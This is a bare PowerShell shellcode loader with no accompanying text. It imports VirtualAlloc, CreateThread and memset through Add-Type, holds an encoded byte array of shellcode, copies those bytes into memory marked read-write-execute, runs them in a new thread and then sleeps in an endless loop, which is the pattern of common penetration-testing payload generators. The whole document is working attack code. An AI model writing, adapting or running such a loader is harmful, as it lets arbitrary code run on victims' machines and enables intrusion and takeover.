$H9S = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $H9S -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x46,0x0f,0x64,0xcf,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x45,0x13,0x83,0xed,0xfc,0x03,0x45,0x49,0xed,0x91,0x33,0xbd,0x73,0x59,0xcc,0x3d,0x14,0xd3,0x29,0x0c,0x14,0x87,0x3a,0x3e,0xa4,0xc3,0x6f,0xb2,0x4f,0x81,0x9b,0x41,0x3d,0x0e,0xab,0xe2,0x88,0x68,0x82,0xf3,0xa1,0x49,0x85,0x77,0xb8,0x9d,0x65,0x46,0x73,0xd0,0x64,0x8f,0x6e,0x19,0x34,0x58,0xe4,0x8c,0xa9,0xed,0xb0,0x0c,0x41,0xbd,0x55,0x15,0xb6,0x75,0x57,0x34,0x69,0x0e,0x0e,0x96,0x8b,0xc3,0x3a,0x9f,0x93,0x00,0x06,0x69,0x2f,0xf2,0xfc,0x68,0xf9,0xcb,0xfd,0xc7,0xc4,0xe4,0x0f,0x19,0x00,0xc2,0xef,0x6c,0x78,0x31,0x8d,0x76,0xbf,0x48,0x49,0xf2,0x24,0xea,0x1a,0xa4,0x80,0x0b,0xce,0x33,0x42,0x07,0xbb,0x30,0x0c,0x0b,0x3a,0x94,0x26,0x37,0xb7,0x1b,0xe9,0xbe,0x83,0x3f,0x2d,0x9b,0x50,0x21,0x74,0x41,0x36,0x5e,0x66,0x2a,0xe7,0xfa,0xec,0xc6,0xfc,0x76,0xaf,0x8e,0x31,0xbb,0x50,0x4e,0x5e,0xcc,0x23,0x7c,0xc1,0x66,0xac,0xcc,0x8a,0xa0,0x2b,0x33,0xa1,0x15,0xa3,0xca,0x4a,0x66,0xed,0x08,0x1e,0x36,0x85,0xb9,0x1f,0xdd,0x55,0x46,0xca,0x48,0x53,0xd0,0x35,0x7d,0xe4,0x48,0xde,0x7c,0x1b,0x89,0xa5,0x08,0xfd,0xd9,0x89,0x5a,0x52,0x99,0x79,0x1b,0x02,0x71,0x90,0x94,0x7d,0x61,0x9b,0x7e,0x16,0x0b,0x74,0xd7,0x4e,0xa3,0xed,0x72,0x04,0x52,0xf1,0xa8,0x60,0x54,0x79,0x5f,0x94,0x1a,0x8a,0x2a,0x86,0xca,0x7a,0x61,0xf4,0x5c,0x84,0x5f,0x93,0x60,0x10,0x64,0x32,0x37,0x8c,0x66,0x63,0x7f,0x13,0x98,0x46,0xf4,0x9a,0x0c,0x29,0x62,0xe3,0xc0,0xa9,0x72,0xb5,0x8a,0xa9,0x1a,0x61,0xef,0xf9,0x3f,0x6e,0x3a,0x6e,0xec,0xfb,0xc5,0xc7,0x41,0xab,0xad,0xe5,0xbc,0x9b,0x71,0x15,0xeb,0x1d,0x4d,0xc0,0xd5,0x6b,0xbf,0xd0;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Nb7=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Nb7.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Nb7,0,0,0);for (;;){Start-sleep 60};